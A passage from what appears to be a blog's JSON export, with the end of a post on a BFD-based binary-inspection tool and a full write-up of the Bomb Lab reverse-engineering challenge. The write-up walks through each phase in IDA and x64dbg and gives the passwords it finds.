manual</strong></a> to implement it into the load program </p>\n<h2><strong>How to use</strong></h2>\n<p>There are 6 options in the interface:</p>\n<p>1. \n    <code>    load --help    </code></p>\n<ul>\n<li><p>Shows the help menu (equivalent to -h).</p>\n<p>  <img src=\"/assets/images/tools/the_binary_loader/1.png\" alt=\"alt text\"></p>\n<hr>\n</li>\n</ul>\n<p>2. \n    <code>    load -d &lt;Binary&gt;    </code></p>\n<ul>\n<li><p>Shows the details of the loaded binary.\n<img src=\"/assets/images/tools/the_binary_loader/2.png\" alt=\"alt text\"></p>\n<hr>\n</li>\n</ul>\n<p>3. \n    <code>    load -sec &lt;Binary&gt;    </code></p>\n<ul>\n<li><p>Shows the  sections details of the loaded binary.\n<img src=\"/assets/images/tools/the_binary_loader/3.png\" alt=\"alt text\"></p>\n<hr>\n</li>\n</ul>\n<p>4. \n    <code>    load -sym &lt;Binary&gt;    </code></p>\n<ul>\n<li><p>Shows the symbols details of the loaded binary.\n<img src=\"/assets/images/tools/the_binary_loader/4.png\" alt=\"alt text\"></p>\n<hr>\n</li>\n</ul>\n<p>5. \n    <code>    load -all &lt;Binary&gt;    </code></p>\n<ul>\n<li><p>Shows all previous details of the loaded binary together.\n<img src=\"/assets/images/tools/the_binary_loader/5.png\" alt=\"alt text\">\n<img src=\"/assets/images/tools/the_binary_loader/6.png\" alt=\"alt text\"></p>\n<hr>\n</li>\n</ul>\n<p>6. \n    <code>    load -con &lt;section_name&gt; &lt;Binary&gt;    </code></p>\n<ul>\n<li>Shows the row data of the mentioned section.<br><img src=\"/assets/images/tools/the_binary_loader/7.png\" alt=\"alt text\"></li>\n</ul>\n<hr>\n<h2><strong>References/Resources</strong></h2>\n<ul>\n<li>The  <a href=\"https://practicalbinaryanalysis.com/\">Practical Binary Analysis</a> book chapter 4</li>\n<li><a href=\"https://ftp.gnu.org/old-gnu/Manuals/bfd-2.9.1/html_mono/bfd.html\">Binary File Descriptor Library</a> user-manual</li>\n</ul>\n"
  },
  {
    "id": "/post/bomb_lab",
    "slug": "bomb_lab",
    "title": "Bomb lab Write-up",
    "description": "BOMB lab is a challenge that you must reverse the binary to find all the 6 nessessory passwords.",
    "date": "October 5, 2023",
    "readTime": "9 min read",
    "tags": [
      "Malware"
    ],
    "category": "Tutorials & Labs",
    "imageUrl": "/assets/images/reverse-engineering/runing-the-binary.png",
    "content": "<h1>What is BOMB lab ?</h1>\n<p>Bomb lab is a famous challenge that is considered as one of the best steps to enter the realm of Reverse Engineering.</p>\n<p>In this challenge, We have 2 files: BOMB (the binary itself) and a pdb file, We must crack the binary by finding all the nessessory passwords.</p>\n<p><strong>Note that</strong> the author <strong>DrEvil</strong> has created lots of bombs, and can distribute as many new ones as he pleases, If you download a second bomb, it may be a different bomb.</p>\n<hr>\n<hr>\n<h1><strong>Tools</strong></h1>\n<ul>\n<li>IDA-Free.</li>\n<li>Any Debugger (I will use x64dbg).</li>\n</ul>\n<hr>\n<hr>\n<h1><strong>Running the binary</strong></h1>\n<p>First, we run the program:</p>\n<p><img src=\"/assets/images/reverse-engineering/runing-the-binary.png\" alt=\"Runing the binary\"> </p>\n<p>So we have 6 phases that require 6 passwords to crack.</p>\n<hr>\n<h1><strong>Phase 1</strong></h1>\n<p>Now we open it in IDA and load the pdb file with it.</p>\n<p>In the main function we see our previous output being printed then a &quot;ReadLine&quot; function which will be passed as an argument to &quot;j_phase_1&quot; function.</p>\n<p><img src=\"/assets/images/reverse-engineering/open-in-IDA.png\" alt=\"alt text\"></p>\n<p>Diving into phase_1, we see that it calls <strong>&quot;j_strings_not_equal&quot;</strong> function to compare our input with <strong>&quot;I am just a renegade hockey mom.&quot;</strong> if the are equal it returns, if not, it calls <strong>explode_bomb</strong></p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-1.png\" alt=\"alt text\"></p>\n<p>Let&#39;s use that as input:</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-1-defused.png\" alt=\"alt text\"></p>\n<p>So, our first password is &quot;<span style=\"color:#00FFFF;\"><strong>I am just a renegade hockey mom.</strong></span>&quot;</p>\n<hr>\n<h1><strong>Phase 2</strong></h1>\n<p>Now we goes to <strong>&quot;Phase_2&quot;</strong> function, We see a call to <strong>&quot;j_read_six_numbers&quot;</strong> function, be entering it we see that it ensures that our input consists of 6 integers.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-2-a.png\" alt=\"alt text\"> </p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-2-b.png\" alt=\"alt text\"></p>\n<p>After that a comparison happens between our first input and &#39;1&#39;, then a loop starts at <strong>&quot;loc_14001210D&quot;</strong> to check for the rest of the input.</p>\n<p>Now we some manipulation then a comparison with our input.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-2-c.png\" alt=\"alt text\"></p>\n<p>To follow the sequence of inputs more easily, We can open x64dbg and set a break point there.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-2-d.png\" alt=\"alt text\"></p>\n<p>The resulting sequence is &quot;<span style=\"color:#00FFFF;\"><strong>1 2 4 8 16 32</strong></span>&quot; which is the second password, Lets Try It</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-2-defused.png\" alt=\"alt text\"></p>\n<p><strong>That is great !!</strong></p>\n<hr>\n<h1><strong>Phase 3</strong></h1>\n<p>By entering the <strong>&quot;phase_3&quot;</strong>, we see a call to <strong>&quot;j_sscanf&quot;</strong> function to ensure that our input Consists of 2 integer numbers, a comparison with 7 happends then it enters a &quot;Switch-cases&quot; function, after that a comparison with 5.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-3-a.png\" alt=\"alt text\">\n<img src=\"/assets/images/reverse-engineering/Phase-3-b.png\" alt=\"alt text\"></p>\n<p>So, We know that we have 7 cases and our first input must be less than 5.</p>\n<p><span style=\"color:#00FFFF;\"><strong>How does the switch works?</strong></span></p>\n<ul>\n<li>First, jumps to the case that matches our first input which is stored in eax. </li>\n<li>Second, it preform repetitive subtraction with { 0x7E, 0x274, 0x24C, 0x2B0 }  from eax to ensure the existence of a certain value in it</li>\n<li>Third, it checks if the value calculated in eax equals to our input</li>\n</ul>\n<p> <img src=\"/assets/images/reverse-engineering/Phase-3-c.png\" alt=\"alt text\"></p>\n<p>Depending on what we know, there could be more that one password, to know some of possible values, we can set a break point at the comparison and sees the value in eax.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Some of these values are:</strong></span></p>\n<pre><code> 5  -126\n 4   0\n 2   562\n 1  -26\n 0   602\n</code></pre>\n<hr>\n<h1><strong>Phase 4</strong></h1>\n<p>Getting into the next phase we see our usual <strong>&quot;j_sscanf&quot;</strong> function, so our input is 2 integers.</p>\n<p>A comparison with &#39;0xE&#39; to make sure that our input is less that  or equal &#39;14&#39;, then we have a call to <strong>&quot;j_func4&quot;</strong> function.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-4-a.png\" alt=\"alt text\"></p>\n<p>By entering the <strong>&quot;j_func4&quot;</strong>, we can see that it is a recursion function that does some math manipulation and repeats until eax equals our first input then it returns</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-4-b.png\" alt=\"alt text\"></p>\n<p>After that a comparison happends to ensure that the second input and the return value from <strong>&quot;j_func4&quot;</strong> are &quot;0xA&quot;.</p>\n<p>Now, we know that our second input is 10 (&#39;A&#39; in hex), So to know the first input we could just follow the math to find out that it is &#39;3&#39;.</p>\n<p>So, the forth password is &quot; <span style=\"color:#00FFFF;\"><strong>3 10</strong></span> &quot;, Let&#39;s try it.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-4-defused.png\" alt=\"alt text\"></p>\n<p><strong>Well Done !!</strong></p>\n<hr>\n<h1><strong>Phase 5</strong></h1>\n<p>In this phase we have 2 integer inputs as usual, After that a loop starts.</p>\n<p>The first input is used as index to a hard-coded array, the first element in\nthe indexed array is compared to &#39;0xF&#39;, if not it does some math operations then iterates to the next element, our first element must makes the loop iterates for 15 times (&#39;F&#39; in hex). </p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-5-a.png\" alt=\"alt text\"></p>\n<p>Following the math, We conclude that the first input is <span style=\"color:#00FFFF;\"><strong>5</strong></span> and the second is <span style=\"color:#00FFFF;\"><strong>115</strong></span> (&#39;73&#39; in hex).</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-5-b.png\" alt=\"alt text\"></p>\n<p><strong>let&#39;s try that</strong></p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-5-defused.png\" alt=\"alt text\"></p>\n<p><strong>Good job !!</strong></p>\n<hr>\n<h1><strong>Phase 6</strong></h1>\n<p>In this phase there is a recall to <strong>&quot;j_read_six_numbers&quot;</strong> function to ensure that our input consists of 6 integers, After that we encounter 3 loops.</p>\n<p>The first one ensures that our 6 integer-inputs are between 1 and 6.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-6-loop1.png\" alt=\"alt text\"></p>\n<p>The second one ensures that there is no duplication.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-6-loop2.png\" alt=\"alt text\"></p>\n<p>The third one re-order our input&#39;s elements in another linked list.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-6-loop3.png\" alt=\"alt text\"></p>\n<p>Now we know that our password is { 1, 2, 3, 4, 5, 6 }, we just need to know the order.</p>\n<p>By checking the content of the nodes we see that </p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-6-a.png\" alt=\"alt text\"><br><img src=\"/assets/images/reverse-engineering/Phase-6-b.png\" alt=\"alt text\"></p>\n<p>If we ordered our nodes by their values descendingly we get <span style=\"color:#00FFFF;\"><strong>5 4 3 1 6 2</strong></span>, Let&#39;s try it.</p>\n<p><img src=\"/assets/images/reverse-engineering/Phase-6-defused.png\" alt=\"alt text\"></p>\n<p>That is incredible !!</p>\n<p>Don&#39;t be too happy, there&#39;s still the <span style=\"color:#FF0000;\"><strong>Secret_Phase</strong></span>.</p>\n<hr>\n<h1><strong>Secret Phase</strong></h1>\n<p>Inside the <strong>&quot;phase_defused&quot;</strong> function, we see that it calls the previously mentioned <strong>&quot;j_sscanf&quot;</strong> function at the end of evey phase, it checks if one of our previous inputs was consisting of 2 integers and a string.</p>\n<p> If that exists, it checks if that string equals <strong>&quot;DrEvil&quot;</strong>, if true the secret phase is defused along with phase-6, If not, only phase-6 is defused.</p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-a.png\" alt=\"alt text\"></p>\n<p>To know which input it checks for, We can use x64dbg to see that the first arguments to the <strong>&quot;j_sscanf&quot;</strong> are <strong>&quot;3 10&quot;</strong> which were the password for phase-4</p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-b.png\" alt=\"alt text\"></p>\n<p>Now we know that phase-4 can trigger the secret phase if we used the <strong>&quot;%d %d %s&quot;</strong> format in our input.</p>\n<p>We know\nthat  that our 2 integers must be (3 10) to make sure the phase-4 is defused, and the string must be &quot;DrEvil&quot; as previously mentioned.</p>\n<p>So, Let&#39;s test that </p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-triggered.png\" alt=\"alt text\"></p>\n<p>Great, We triggered it successfully, Now we have to defuse it.</p>\n<p>The <strong>&quot;Secret_phase&quot;</strong> function firstly converts our input from ASCII to integer then compares it with <code>1</code> then &#39;0x3E9&#39; (which is 1001 in decimal), then calls a function named <strong>&quot;j_func7&quot;</strong> and compares it&#39;s return value with &#39;5&#39;, if equals then phase is defuse.</p>\n<p>So, our input must be between (1 : 1001 ) and the return of the <strong>&quot;j_func7&quot;</strong> must be 5.</p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-c.png\" alt=\"alt text\"></p>\n<p>By getting into the <strong>&quot;j_func7&quot;</strong>, it&#39;s another recursion.</p>\n<p>Like the one in phase four, it does some math manipulation and repeats until eax equals our input then it returns.</p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-d.png\" alt=\"alt text\"></p>\n<p>The brute-force is more difficult this time and the math is tricky, so let&#39;s simplify the math way.</p>\n<p>The <strong>&quot;j_func7&quot;</strong> takes 2 arguments, arg1 is n1 and arg2 is our input.</p>\n<p>First it compares between our input an the value in n1</p>\n<ul>\n<li>If &gt; n1, it goes to the yellow code, which changes the value in n1 then recall the <strong>&quot;j_func7&quot;</strong>.</li>\n<li>If = n1, it goes to the blue code, which will set eax to 0 then ends the repetition.</li>\n<li>If &lt; n1, it goes to the red code, which changes the value in n1 then recall the <strong>&quot;j_func7&quot;</strong>.</li>\n</ul>\n<p>But how the changing in n1 works?</p>\n<p>If we looked inside the n1 we can see that it is a tree that each node points to two other nodes.</p>\n<p>As we see, n1 has a value of &#39;36&#39; (0x24 in hex) and two pointers to n21 and n22, which have the values of (8 and 50).</p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-e.png\" alt=\"alt text\"></p>\n<p>If we continued like that we can conclude that our tree could be illustrated like that </p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-f.png\" alt=\"alt text\"></p>\n<p>Now how does the return value change?</p>\n<ul>\n<li>The yellow code makes the eax equals to ( eax + eax + 1), we will called right.</li>\n<li>The red code makes the eax equals to ( eax + eax ) , we will call it left.</li>\n<li>Thn blue code sets eax to &#39;0&#39; and ends the repetition.</li>\n</ul>\n<p>Since these function calls are being made recursively, the math being applied to eax is executed LIFO (Last In First Out), executing the last modifications to eax first. </p>\n<p>The value in eax could be &#39;5&#39; like that:</p>\n<ul>\n<li>eax = 1 (0 + 0 + 1) ---&gt;  # Right</li>\n<li>eax = 2 (1 + 1    ) ---&gt;  # Left</li>\n<li>eax = 5 (2 + 2 + 1) ---&gt;  # Right</li>\n</ul>\n<p>Which gives us the following order R --&gt; L --&gt;R in our tree, which gives us the value of &#39;<span style=\"color:#00FFFF;\"><strong>47</strong></span>&#39;.</p>\n<p>Let&#39;s try this.</p>\n<p><img src=\"/assets/images/reverse-engineering/Secret-phase-defused.png\" alt=\"alt text\"></p>\n<p>Finally, we did it !!!</p>\n<hr>\n<hr>\n<h1><strong>Passwords</strong></h1>\n<ul>\n<li><strong>I am just a renegade hockey mom.</strong></li>\n<li><strong>1 2 4 8 16 32</strong></li>\n<li><strong>4 0</strong></li>\n<li><strong>3 10 DrEvil</strong></li>\n<li><strong>5 115</strong></li>\n<li><strong>5 4 3 1 6 2</strong></li>\n<li><strong>47</strong></li>\n</ul>\n<hr>\n<h1><strong>conclusion</strong></h1>\n<p>I think that this one was as fun as it was tiring, I have learnt a lot from it and I hope you did to. </p>\n<p>Stay tuned for more reversing.</p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  }
]